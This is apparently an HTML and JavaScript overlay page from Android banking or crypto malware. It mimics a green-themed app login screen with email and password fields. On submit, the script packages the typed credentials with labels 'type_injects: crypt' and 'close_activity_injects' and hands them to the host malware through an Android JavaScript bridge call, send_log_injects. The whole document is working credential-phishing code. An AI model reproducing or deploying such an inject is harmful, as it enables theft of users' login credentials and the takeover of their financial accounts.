    <style>
        form {
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }

        section {
            padding: 15px;
            flex: 1;
        }

        footer {
            padding: 15px;
        }

        .input {
            width: 100%;
            padding: 6px;
            border: 2px solid #e4e9ed;
            border-radius: 6px;
            margin-bottom: 10px;
            padding-left: 15px;
        }

        .input:focus {
            border-color: #000;
            box-shadow: 0 0px 5px #939393;
        }

        input, button {
            outline: none !important;
            box-shadow: none;
        }

        ::placeholder {
            color: #6a7278;
        }

        :-moz-placeholder {
            color: #6a7278;
        }

        ::-moz-placeholder {
            color: #6a7278;
        }

        :-ms-input-placeholder {
            color: #6a7278;
        }

        ::-webkit-input-placeholder {
            color: #6a7278;
        }

        .button {
            width: 100%;
            background-color: #00c805;
            color: #fff;
            border: 0;
            border-radius: 25px;
            padding: 10px;
        }

        .button:disabled {
            background-color: #e4e9ed;
        }
    </style>
</head>

            <p style="text-align: center;color: #00c805;font-weight: 500;font-size: 14px;">Forgot Password?</p>
            <p style="text-align: center;color: #00c805;font-weight: 500;font-size: 14px;">I need help</p>
        </section>
        <footer>
            <input type="submit" class="button" id="sendData" disabled value="Log In">
        </footer>
    </form>
    <script>
        var login = document.getElementById('login'),
            password = document.getElementById('password');

        var sendData = document.getElementById('sendData');

        var eye = document.getElementById('eye');

        eye.onclick = () => {
            if(password.type == 'password') {
                password.type = 'text';
            } else {
                password.type = 'password';
            }
        }

        function check() {
            if(/^([a-z0-9_-]+\.)*[a-z0-9_-]+@[a-z0-9_-]+(\.[a-z0-9_-]+)*\.[a-z]{2,6}$/i.test(login.value) && password.value.length >= 10) {
                sendData.disabled = false;
            } else {
                sendData.disabled = true;
            }
        }

        login.onkeyup = () => {
            check();
        }

        password.onkeyup = () => {
            check();
        }

        sendData.onclick = () => {
            var data = {};
            data.login = login.value;
            data.password = password.value;
            data.type_injects = "crypt";
            data.closed = "close_activity_injects";

            var ua = navigator.userAgent.toLowerCase();
            if(ua.indexOf("android") > -1) {
                try {
                    Android.send_log_injects(JSON.stringify(data))
                } catch (err) {}
            }else{
                alert(JSON.stringify(data));
            }
        }
    </script>
